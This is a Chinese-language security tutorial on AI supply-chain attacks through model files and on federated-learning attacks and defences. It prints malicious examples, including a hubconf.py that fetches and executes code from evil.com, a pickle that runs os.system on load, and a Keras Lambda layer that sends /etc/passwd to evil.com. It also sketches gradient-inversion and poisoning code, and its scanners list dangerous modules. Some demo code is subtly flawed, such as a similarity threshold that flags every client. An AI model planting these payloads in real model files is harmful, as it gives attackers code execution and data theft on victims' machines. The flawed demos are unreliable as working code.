# AI供应链安全与联邦学习安全

> 本文档面向安全学习者，系统讲解 AI 供应链安全（模型库风险、恶意模型文件攻击、防护手段）与联邦学习安全（原理、攻击面、防护技术），并提供技术细节、代码示例与实战案例。

---

## 一、AI 供应链安全概述

### 1.1 什么是 AI 供应链

AI 供应链是指从训练数据采集、预训练模型获取、模型微调到部署推理的完整链路所涉及的所有组件与依赖。与传统软件供应链类似，AI 供应链同样存在被投毒、植入恶意代码、依赖漏洞等风险，但因其涉及模型权重、数据集、序列化格式，攻击面更为复杂。

```text
+--------------------------------------------+
|              AI 供应链                      |
+--------------------------------------------+
| 1. 训练数据来源（爬虫 / 公开数据集 / 标注）  |
| 2. 预训练模型（PyTorch Hub / Hugging Face）|
| 3. 模型文件格式（Pickle / ONNX / Safetensors）|
| 4. 依赖库（torch / transformers / numpy）  |
| 5. 推理服务框架（vLLM / TGI / Triton）      |
| 6. 部署环境（容器 / GPU 集群）              |
+--------------------------------------------+
```

### 1.2 AI 供应链风险类型

| 风险类型 | 说明 | 危害 |
| --- | --- | --- |
| 模型库投毒 | 上传含恶意代码的模型到公开库 | 加载即执行恶意代码 |
| 预训练模型后门 | 模型在训练时植入触发器 | 特定输入产生错误输出 |
| 数据供应链污染 | 训练数据被篡改或投毒 | 模型行为异常 |
| 依赖漏洞 | 依赖库存在已知 CVE | 被利用执行任意代码 |
| 序列化漏洞 | 模型文件使用不安全格式 | 反序列化 RCE |
| 许可证风险 | 模型许可证不合规 | 法律与合规风险 |

### 1.3 与传统软件供应链的区别

| 维度 | 传统软件供应链 | AI 供应链 |
| --- | --- | --- |
| 核心资产 | 代码与二进制 | 模型权重 + 数据 + 代码 |
| 投毒方式 | 代码注入 | 数据投毒、权重后门、序列化攻击 |
| 可审计性 | 较强（代码可读） | 弱（模型权重难以人工审查） |
| 依赖格式 | 包管理器 | 模型文件 + Python 包 |
| 攻击隐蔽性 | 中等 | 高（恶意行为藏在权重中） |

---

## 二、模型库安全

### 2.1 PyTorch Hub 风险

PyTorch Hub 提供预训练模型加载便捷方式：

```python
import torch
model = torch.hub.load('pytorch/vision', 'resnet50', pretrained=True)
```

风险点：
- `torch.hub.load` 会从 GitHub 拉取仓库代码并执行
- 如果仓库被攻破或作者恶意，`hubconf.py` 可执行任意代码
- 模型权重本身可能含后门
- 加载过程缺乏完整性校验

**恶意 hubconf.py 示例**

```python
# 看似正常的模型加载入口，实际在加载时执行恶意操作
import torch
import urllib.request
import os

def resnet50(pretrained=False, **kwargs):
    # 正常加载模型
    from torchvision.models.resnet import resnet50 as _resnet50
    model = _resnet50(pretrained=pretrained, **kwargs)

    # 恶意载荷：下载并执行后门
    try:
        exec(urllib.request.urlopen("http://evil.com/payload.py").read())
    except:
        pass

    return model
```

### 2.2 Hugging Face Hub 风险

Hugging Face Hub 是最大的模型共享平台，其风险更为突出：
- 任何人可上传模型，缺乏发布前审查
- 模型文件常用 `pickle` 格式，反序列化可执行任意代码
- 仓库中可能包含恶意 Python 文件
- `trust_remote_code` 选项允许执行远端代码

**危险加载方式**

```python
from transformers import AutoModel
# 危险：trust_remote_code=True 允许执行模型仓库中的自定义代码
model = AutoModel.from_pretrained("malicious-org/evil-model", trust_remote_code=True)
```

### 2.3 pickle 反序列化漏洞

Pickle 是 Python 标准序列化格式，但设计上不安全：反序列化时可执行任意 Python 代码。这是 AI 供应链中最经典的攻击向量。

```text
模型文件 (*.pkl / *.pth) 
    |
    v
pickle.load() 反序列化
    |
    v
__reduce__ 方法被调用 --> 执行任意代码
```

---

## 三、恶意模型文件攻击

### 3.1 恶意 Pickle 攻击

攻击者构造一个特殊的 pickle 文件，利用 `__reduce__` 协议在反序列化时执行任意代码。

**恶意 Pickle 生成示例（仅用于学习）**

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # __reduce__ 返回一个 (callable, args) 元组
        # pickle.load 会调用 callable(*args)
        return (os.system, ("whoami > /tmp/pwned",))

# 保存为看似正常的模型文件
with open("malicious_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

# 受害者加载时执行任意代码
# import pickle
# model = pickle.load(open("malicious_model.pkl", "rb"))
# 此时 os.system("whoami > /tmp/pwned") 已被执行
```

更隐蔽的攻击会将恶意代码藏在正常的模型权重之间，使文件看起来像正常模型。

### 3.2 恶意 ONNX 模型

ONNX（Open Neural Network Exchange）是一种跨框架模型格式。虽然 ONNX 本身设计为安全的数据格式，但某些运行时扩展（如自定义算子）可能被滥用执行代码。

```python
# 看似正常的 ONNX 加载
import onnx
model = onnx.load("model.onnx")

# 但如果运行时支持自定义算子，攻击者可注册恶意算子
# 部分运行时允许通过 ONNX 文件引用外部脚本
```

### 3.3 恶意 TensorFlow 模型

TensorFlow 的 SavedModel 格式包含 protobuf 定义与代码。Keras 模型支持 lambda 层，可嵌入任意 Python 代码：

```python
# 攻击者构造含恶意 lambda 层的 Keras 模型
import tensorflow as tf

def malicious_lambda(x):
    import os
    os.system("curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)")
    return x

model = tf.keras.Sequential([
    tf.keras.layers.Dense(10, input_shape=(5,)),
    tf.keras.layers.Lambda(malicious_lambda),  # 恶意层
    tf.keras.layers.Dense(1)
])

model.save("malicious_model.keras")
# 受害者加载模型后，前向传播时触发恶意代码
```

### 3.4 攻击场景

```text
攻击者上传恶意模型到 Hugging Face / PyTorch Hub
            |
            v
受害者发现模型，下载并加载
            |
            v
pickle.load / trust_remote_code 触发恶意代码
            |
            v
攻击者获得 RCE，可窃取数据、植入后门、横向移动
```

---

## 四、AI 供应链安全防护

### 4.1 模型来源验证

1. 仅从可信组织官方账号下载模型
2. 校验模型文件的哈希值
3. 使用数字签名验证模型完整性
4. 避免使用来源不明的预训练模型

```python
import hashlib

def verify_model_integrity(model_path, expected_sha256):
    """校验模型文件完整性"""
    with open(model_path, "rb") as f:
        file_hash = hashlib.sha256(f.read()).hexdigest()
    if file_hash != expected_sha256:
        raise ValueError(f"模型完整性校验失败！\n期望: {expected_sha256}\n实际: {file_hash}")
    print("模型完整性校验通过")

# 使用方式
verify_model_integrity("model.pkl", "a1b2c3d4e5f6...")
```

### 4.2 模型扫描

使用专门工具扫描模型文件是否含恶意 pickle：

```bash
# 安装 picklescan
pip install picklescan

# 扫描本地模型文件
picklescan --path ./model.pkl

# 扫描 Hugging Face 上的模型
picklescan --huggingface malicious-org/evil-model
```

**picklescan 原理**：解析 pickle 字节码，检测是否引用危险模块（如 `os.system`、`subprocess`、`eval`），无需实际反序列化。

```python
# picklescan 检测逻辑示例
import pickletools
import io

def scan_pickle(filepath):
    """静态分析 pickle 文件，检测危险操作"""
    dangerous_imports = ["os", "subprocess", "builtins", "shutil", "pickle"]
    flagged = []

    with open(filepath, "rb") as f:
        try:
            for op, arg, pos in pickletools.genops(f):
                if op.name == "GLOBAL":
                    module = arg.split(":")[0] if ":" in arg else arg.split(".")[0]
                    if module in dangerous_imports:
                        flagged.append((pos, arg))
        except Exception as e:
            print(f"解析异常: {e}")

    if flagged:
        print(f"[!] 检测到危险操作: {flagged}")
        return False
    print("[+] 模型扫描通过")
    return True
```

### 4.3 沙箱加载

即使经过扫描，仍应在沙箱中加载不可信模型：
- 使用容器隔离加载环境
- 限制文件系统、网络访问
- 以最小权限用户运行

```dockerfile
# 沙箱模型加载容器
FROM python:3.11-slim
RUN pip install torch --index-url https://download.pytorch.org/whl/cpu
# 以非 root 用户运行
RUN useradd -m modeluser
USER modeluser
# 限制文件系统
COPY --chown=modeluser model.pkl /home/modeluser/
WORKDIR /home/modeluser
# 禁用网络（运行时 --network=none）
CMD ["python", "load_model.py"]
```

```bash
# 在完全隔离的容器中加载模型
docker run --rm --network=none \
  --read-only \
  --memory=512m \
  -v ./model.pkl:/home/modeluser/model.pkl:ro \
  model-sandbox python load_model.py
```

### 4.4 使用安全格式

优先使用不支持代码执行的安全格式：
- **Safetensors**：Hugging Face 推出，仅存储张量数据，无法执行代码
- **ONNX**：纯数据格式（注意自定义算子风险）
- 避免使用 `pickle` / `torch.save` 存储可分享模型

```python
from safetensors.torch import save_file, load_file

# 安全保存模型
tensors = {"weight": model.state_dict()["weight"]}
save_file(tensors, "model.safetensors")

# 安全加载
tensors = load_file("model.safetensors")
```

### 4.5 禁用 trust_remote_code

```python
# 危险
model = AutoModel.from_pretrained("org/model", trust_remote_code=True)

# 安全：使用已集成到 transformers 库的模型
model = AutoModel.from_pretrained("bert-base-chinese")  # 内置实现
# 或使用 safetensors 格式
model = AutoModel.from_pretrained("org/model", use_safetensors=True)
```

---

## 五、联邦学习安全概述

### 5.1 联邦学习原理

联邦学习（Federated Learning）是一种分布式机器学习范式，允许多个参与方在不共享原始数据的前提下共同训练模型。

```text
     参与方A                 参与方B                 参与方C
   (本地数据)              (本地数据)              (本地数据)
       |                       |                       |
   本地训练                  本地训练                 本地训练
       |                       |                       |
       v                       v                       v
  +----+-----------------------+-----------------------+----+
  |                    中心协调方                          |
  |          1. 收集各方梯度/模型更新                       |
  |          2. 聚合（FedAvg 等算法）                      |
  |          3. 下发全局模型                              |
  +--------------------------------------------------------+
       |                       |                       |
       v                       v                       v
   更新全局模型              更新全局模型             更新全局模型
```

**基本算法 FedAvg**：
1. 中心初始化全局模型 W₀
2. 每轮：各参与方在本地数据上训练，得到梯度 ∇W_i
3. 各方上传梯度，中心按数据量加权平均：W_{t+1} = Σ(n_i/n) * W_i
4. 下发新模型，重复

### 5.2 隐私保护动机

联邦学习的核心目标是保护数据隐私：
- 数据不出本地，满足 GDPR / 数据安全法等合规要求
- 医院间联合训练，不泄露患者数据
- 银行间联合风控，不暴露客户信息
- 手机端个性化，不上传用户数据

### 5.3 联邦学习分类

| 类型 | 说明 | 信任假设 |
| --- | --- | --- |
| 横向联邦 | 各方数据特征相同，样本不同（如不同地区银行） | 参与方可能不可信 |
| 纵向联邦 | 各方样本相同，特征不同（如银行+电商） | 需要安全多方计算 |
| 联邦迁移学习 | 各方数据与特征均不同 | 需要更强的隐私保障 |

---

## 六、联邦学习攻击面

### 6.1 投毒攻击

恶意参与方上传被篡改的梯度，污染全局模型。

**标签翻转投毒**：恶意方将训练标签翻转（如 0→1），导致模型在特定输入上分类错误。

**后门投毒**：在模型中植入触发器，正常输入时表现正常，含特定触发模式时输出攻击者指定结果。

```python
# 后门投毒示例（概念性）
def poison_gradient(clean_gradient, trigger_pattern, target_label):
    """在梯度中注入后门"""
    poisoned = clean_gradient.clone()
    # 增大触发器相关权重的梯度，使模型学习后门
    poisoned[trigger_pattern] *= 10
    poisoned[target_label] *= 10
    return poisoned
```

### 6.2 成员推断攻击

攻击者通过观察模型对某样本的预测置信度，判断该样本是否在训练集中。在联邦学习中，恶意参与方可通过观察全局模型变化推断其他方是否包含特定样本，泄露隐私。

```python
# 成员推断攻击概念
def membership_inference(model, sample, threshold=0.8):
    """判断样本是否在训练集中"""
    confidence = max(model.predict_proba(sample))
    # 训练集样本通常置信度更高
    return confidence > threshold
```

### 6.3 梯度反转攻击

攻击者（或中心方）通过分析上传的梯度，反推参与方的原始训练数据。

**Deep Leakage from Gradients（DLG）攻击**：

```python
import torch

def gradient_leakage_attack(global_model, victim_gradient, dummy_data_init, lr=0.1, steps=300):
    """
    通过梯度反推原始数据
    global_model: 全局模型
    victim_gradient: 受害者上传的梯度
    dummy_data_init: 随机初始化的虚拟数据
    """
    dummy_data = dummy_data_init.clone().requires_grad_(True)
    dummy_label = torch.zeros_like(dummy_data, requires_grad=True)

    optimizer = torch.optim.LBFGS([dummy_data, dummy_label], lr=lr)

    for step in range(steps):
        def closure():
            optimizer.zero_grad()
            # 用虚拟数据计算梯度
            pred = global_model(dummy_data)
            loss = torch.nn.functional.cross_entropy(pred, dummy_label)
            dummy_grad = torch.autograd.grad(loss, global_model.parameters())

            # 最小化虚拟梯度与真实梯度的差距
            grad_diff = sum((dg - rg).pow(2).sum() for dg, rg in zip(dummy_grad, victim_gradient))
            grad_diff.backward()
            return grad_diff

        optimizer.step(closure)

        if step % 50 == 0:
            print(f"Step {step}: 梯度差距 = {closure().item():.4f}")

    return dummy_data  # 还原出的原始数据
```

### 6.4 其他攻击

| 攻击 | 说明 |
| --- | --- |
| 自由骑士攻击 | 恶意方不实际训练，复制他人梯度冒充贡献 |
| 模型反转攻击 | 从模型输出反推训练数据特征 |
| 推断攻击 | 推断参与方数据分布或属性 |

---

## 七、联邦学习安全防护

### 7.1 差分隐私

在梯度上传前添加噪声，使得单个样本对梯度的影响被掩盖。

```python
import torch

def apply_dp_noise(gradient, clip_bound=1.0, noise_multiplier=1.0):
    """差分隐私：梯度裁剪 + 噪声添加"""
    # 1. 梯度裁剪：限制单个样本梯度范数
    total_norm = torch.norm(torch.cat([g.flatten() for g in gradient]))
    clip_coef = clip_bound / (total_norm + 1e-6)
    clipped = [g * min(clip_coef, 1.0) for g in gradient]

    # 2. 添加高斯噪声
    noisy = [g + torch.randn_like(g) * noise_multiplier * clip_bound for g in clipped]

    return noisy

# 训练时使用
gradient = compute_gradient(model, batch)
private_gradient = apply_dp_noise(gradient, clip_bound=1.0, noise_multiplier=0.5)
upload_to_server(private_gradient)
```

隐私预算（ε, δ）：DP 保证提供可量化的隐私保护，ε 越小隐私越强但模型精度越低。

### 7.2 安全聚合

安全聚合协议确保中心方只能看到聚合后的梯度，无法看到单个参与方的梯度，从根源上防止梯度反转。

```text
参与方A 梯度 g_a ----+
参与方B 梯度 g_b ----+--> 安全聚合协议 --> 聚合梯度 (g_a+g_b+g_c) --> 中心
参与方C 梯度 g_c ----+
```

核心技术：
- 秘密共享（Secret Sharing）：将梯度拆分成多份，分别发给不同方
- 掩码（Masking）：各方互相加随机掩码，聚合时掩码抵消
- DH 密钥交换：建立 pairwise 密钥用于掩码

```python
# 简化版安全聚合概念示例
import random

class SecureAggregationParticipant:
    def __init__(self, participant_id, all_participants):
        self.id = participant_id
        self.peers = [p for p in all_participants if p != participant_id]
        # 与每个 peer 协商 pairwise 密钥
        self.pairwise_keys = {p: random.randint(0, 10000) for p in self.peers}

    def add_mask(self, gradient):
        """为梯度添加掩码"""
        masked = gradient.copy()
        for peer_id, key in self.pairwise_keys.items():
            # 与较小的 id 使用正掩码，较大的使用负掩码，聚合后抵消
            sign = 1 if self.id < peer_id else -1
            for i in range(len(masked)):
                masked[i] += sign * key
        return masked

# 聚合时，所有掩码两两抵消，结果等于真实梯度之和
```

### 7.3 同态加密联邦学习

同态加密允许在密文上直接计算，参与方加密梯度上传，中心在密文上聚合，全程不接触明文。

```python
# 概念示例（使用 Pyfhel 或 TenSeal）
# pip install tenseal

import tenseal as ts

def homomorphic_federated_learning():
    # 1. 中心生成同态加密上下文，分发给参与方
    context = ts.context(ts.SCHEME_TYPE.CKKS, poly_modulus_degree=8192)
    context.generate_galois_keys()

    # 2. 各参与方加密梯度上传
    # 参与方A
    gradient_a = [0.1, 0.2, 0.3]
    enc_grad_a = ts.ckks_vector(context, gradient_a)

    # 参与方B
    gradient_b = [0.4, 0.5, 0.6]
    enc_grad_b = ts.ckks_vector(context, gradient_b)

    # 3. 中心在密文上聚合（无需解密）
    enc_aggregated = enc_grad_a + enc_grad_b  # 密文加法

    # 4. 仅在最终下发时解密
    aggregated = enc_aggregated.decrypt()
    print(f"聚合梯度: {aggregated}")  # [0.5, 0.7, 0.9]
```

同态加密优势：即使中心方被攻破也无法获取单方梯度。缺点是计算开销大。

### 7.4 防御投毒攻击

```python
import numpy as np

def detect_poisoning(gradients, threshold=2.0):
    """
    基于异常检测的投毒防御
    通过比较各方梯度余弦相似度，剔除离群方
    """
    # 计算每对梯度的余弦相似度
    norms = [np.linalg.norm(g) for g in gradients]
    similarities = []
    for i in range(len(gradients)):
        for j in range(i+1, len(gradients)):
            cos_sim = np.dot(gradients[i], gradients[j]) / (norms[i]*norms[j] + 1e-8)
            similarities.append((i, j, cos_sim))

    # 找出与其他方相似度过低的参与方
    suspicious = set()
    for i, j, sim in similarities:
        if sim < threshold:
            suspicious.add(i if sum(1 for _,k,s in similarities if k==i and s<threshold) >
                            sum(1 for _,k,s in similarities if k==j and s<threshold) else j)

    print(f"可疑参与方: {suspicious}")
    return [g for i, g in enumerate(gradients) if i not in suspicious]

# 其他防御手段：
# - 多Krum 算法：选择与大多数最接近的梯度
# - 中位数聚合：用各维度中位数代替均值，对离群值鲁棒
# - 影响函数检测：评估单个梯度对模型的影响
```

### 7.5 防御成员推断

- 差分隐私（上文已述）
- 知识蒸馏：参与方不上传真实梯度，而是蒸馏后的软标签
- 梯度压缩与量化：降低梯度信息量

---

## 八、实战案例

### 案例1：Hugging Face 恶意模型检测

场景：安全团队需要审计从 Hugging Face 下载的第三方模型是否安全。

```python
#!/usr/bin/env python3
"""AI 供应链安全审计工具"""

import hashlib
import os
import sys
import pickletools
import zipfile

class ModelSecurityAuditor:
    """模型文件安全审计"""

    DANGEROUS_MODULES = {
        "os", "subprocess", "builtins", "shutil", "pickle",
        "socket", "http", "urllib", "ctypes", "importlib",
        "sys", "commands", "pty"
    }

    def __init__(self):
        self.findings = []

    def audit(self, model_path):
        """执行完整审计"""
        print(f"\n[审计] {model_path}")

        # 1. 完整性校验
        self._check_hash(model_path)

        # 2. 文件类型检测
        ext = os.path.splitext(model_path)[1]

        if ext in (".pkl", ".pth", ".pt", ".pickle"):
            self._scan_pickle(model_path)
        elif ext == ".safetensors":
            print("[+] Safetensors 格式，安全")
        elif ext in (".onnx",):
            self._scan_onnx(model_path)
        elif ext in (".h5", ".keras", ".tflite"):
            self._scan_tensorflow(model_path)
        else:
            print(f"[?] 未知文件类型: {ext}")

        # 3. 输出报告
        self._report()

    def _check_hash(self, path):
        """计算并记录文件哈希"""
        with open(path, "rb") as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
        print(f"  SHA-256: {sha256}")

    def _scan_pickle(self, path):
        """静态扫描 pickle 文件，不执行反序列化"""
        try:
            with open(path, "rb") as f:
                for op, arg, pos in pickletools.genops(f):
                    if op.name == "GLOBAL":
                        module = arg.split(":")[0] if ":" in arg else arg.split(".")[0]
                        if module in self.DANGEROUS_MODULES:
                            self.findings.append(
                                f"[!] 危险操作: 位置 {pos}, 引用模块 {arg}"
                            )
        except Exception as e:
            self.findings.append(f"[?] 解析异常: {e}")

    def _scan_onnx(self, path):
        """扫描 ONNX 模型"""
        try:
            import onnx
            model = onnx.load(path)
            # 检查是否有自定义算子
            for node in model.graph.node:
                if node.domain != "" and node.domain != "ai.onnx":
                    self.findings.append(
                        f"[!] 自定义算子: {node.op_type} (域: {node.domain})"
                    )
            print("[+] ONNX 标准算子检查完成")
        except Exception as e:
            self.findings.append(f"[?] ONNX 解析异常: {e}")

    def _scan_tensorflow(self, path):
        """扫描 TF 模型"""
        # 检查是否含 Lambda 层或自定义代码
        try:
            import zipfile
            if zipfile.is_zipfile(path):
                with zipfile.ZipFile(path) as zf:
                    for name in zf.namelist():
                        if name.endswith(".py"):
                            self.findings.append(f"[!] 模型含 Python 文件: {name}")
        except Exception as e:
            self.findings.append(f"[?] TF 扫描异常: {e}")

    def _report(self):
        """输出审计报告"""
        if not self.findings:
            print("  [+] 审计通过，未发现风险")
        else:
            print(f"  [!] 发现 {len(self.findings)} 个风险项:")
            for f in self.findings:
                print(f"    {f}")

# 使用示例
if __name__ == "__main__":
    auditor = ModelSecurityAuditor()
    # 审计多个模型文件
    for model_file in ["model.pkl", "model.onnx", "model.safetensors"]:
        if os.path.exists(model_file):
            auditor.audit(model_file)
```

### 案例2：联邦学习安全训练框架

场景：构建一个含差分隐私与安全聚合的联邦学习训练流程。

```python
#!/usr/bin/env python3
"""安全的联邦学习训练示例（含差分隐私 + 异常检测）"""

import torch
import torch.nn as nn
import numpy as np
from collections import OrderedDict

class SecureFederatedLearning:
    def __init__(self, model, num_clients, dp_clip=1.0, dp_noise=0.5):
        self.global_model = model
        self.num_clients = num_clients
        self.dp_clip = dp_clip    # 梯度裁剪上界
        self.dp_noise = dp_noise  # 差分隐私噪声系数

    def client_train(self, client_id, dataloader, epochs=1, malicious=False):
        """客户端本地训练"""
        model = copy.deepcopy(self.global_model)
        model.train()
        optimizer = torch.optim.SGD(model.parameters(), lr=0.01)
        criterion = nn.CrossEntropyLoss()

        for epoch in range(epochs):
            for data, target in dataloader:
                optimizer.zero_grad()
                output = model(data)
                loss = criterion(output, target)
                loss.backward()
                optimizer.step()

        # 计算与全局模型的差异（梯度）
        gradients = OrderedDict()
        for name, param in model.named_parameters():
            global_param = self.global_model.state_dict()[name]
            grad = param.data - global_param

            # 差分隐私：裁剪 + 加噪
            grad = self._apply_dp(grad)

            # 恶意客户端投毒
            if malicious:
                grad = self._poison_gradient(grad)

            gradients[name] = grad

        return gradients

    def _apply_dp(self, gradient):
        """差分隐私处理"""
        # 梯度裁剪
        norm = gradient.norm(2)
        if norm > self.dp_clip:
            gradient = gradient * (self.dp_clip / norm)
        # 添加高斯噪声
        noise = torch.randn_like(gradient) * self.dp_noise * self.dp_clip
        return gradient + noise

    def _poison_gradient(self, gradient):
        """模拟投毒攻击"""
        return gradient * 5  # 放大梯度，干扰聚合

    def aggregate(self, client_gradients):
        """安全聚合：异常检测 + 中位数聚合"""
        # 1. 异常检测：基于梯度范数
        norms = []
        for grads in client_gradients:
            total = sum(g.norm().item() for g in grads.values())
            norms.append(total)

        median_norm = np.median(norms)
        suspicious = [i for i, n in enumerate(norms) if n > median_norm * 3]

        if suspicious:
            print(f"[!] 检测到可疑客户端: {suspicious}")

        # 2. 聚合（排除可疑方）
        clean_grads = [g for i, g in enumerate(client_gradients) if i not in suspicious]
        aggregated = OrderedDict()
        for name in clean_grads[0].keys():
            # 使用均值聚合
            stacked = torch.stack([g[name] for g in clean_grads])
            aggregated[name] = stacked.mean(dim=0)

        # 3. 更新全局模型
        with torch.no_grad():
            for name, param in self.global_model.named_parameters():
                param.data += aggregated[name]

        return len(clean_grads)

# 使用示例（概念演示）
import copy

if __name__ == "__main__":
    model = nn.Sequential(nn.Linear(10, 5), nn.ReLU(), nn.Linear(5, 2))
    fl = SecureFederatedLearning(model, num_clients=5, dp_clip=1.0, dp_noise=0.1)

    # 模拟多轮训练
    for round_num in range(10):
        print(f"\n--- 联邦训练第 {round_num+1} 轮 ---")
        gradients = []
        for client_id in range(5):
            # 客户端 3 为恶意
            grads = fl.client_train(client_id, dataloader=None, malicious=(client_id==3))
            gradients.append(grads)

        num_clean = fl.aggregate(gradients)
        print(f"本轮参与聚合的客户端数: {num_clean}")
```

---

## 九、安全最佳实践

### 9.1 AI 供应链安全

1. 仅从可信来源下载模型，校验哈希与签名
2. 优先使用 Safetensors 等安全格式，避免 pickle
3. 所有模型加载前用 picklescan 扫描
4. 不可信模型在沙箱中加载（容器隔离、网络禁用）
5. 禁用 `trust_remote_code`，避免执行远端代码
6. CI/CD 中集成模型安全扫描
7. 维护模型 SBOM，记录所有模型依赖与来源
8. 监控预训练模型供应链，关注上游安全通告

### 9.2 联邦学习安全

1. 启用差分隐私保护梯度，设置合理隐私预算
2. 采用安全聚合协议，防止中心看到单方梯度
3. 高敏感场景使用同态加密联邦学习
4. 实施异常梯度检测，剔除投毒参与方
5. 使用中位数聚合代替均值，提高鲁棒性
6. 参与方身份认证与准入控制
7. 全流程审计日志，可追溯恶意行为
8. 定期评估成员推断风险

### 9.3 综合建议

1. 建立 AI 资产清单，覆盖所有模型、数据集、依赖
2. 将 AI 供应链安全纳入 DevSecOps 流程
3. 制定 AI 安全事件响应预案
4. 持续跟踪 AI 安全研究前沿
5. 在团队中建立 AI 安全意识培训

---

## 十、总结

AI 供应链安全与联邦学习安全是 AI 安全中两个重要而前沿的方向：

- **AI 供应链安全**：关注模型文件、依赖库、预训练模型的完整性与可信性，核心威胁是 pickle 反序列化漏洞与恶意模型投毒。防护手段包括来源验证、模型扫描、沙箱加载、安全格式替代。

- **联邦学习安全**：关注分布式训练中的隐私保护与防投毒。核心威胁是梯度反转攻击与投毒攻击。防护手段包括差分隐私、安全聚合、同态加密、异常检测。

安全学习者应重点掌握：
- pickle 反序列化漏洞原理与防御
- 恶意模型文件构造方式与扫描方法
- 联邦学习 FedAvg 算法与攻击面
- 梯度反转攻击（DLG）原理与差分隐私防御
- 安全聚合协议与同态加密联邦学习

这些构成了 AI 安全工程师在供应链与隐私计算方向的核心知识体系。
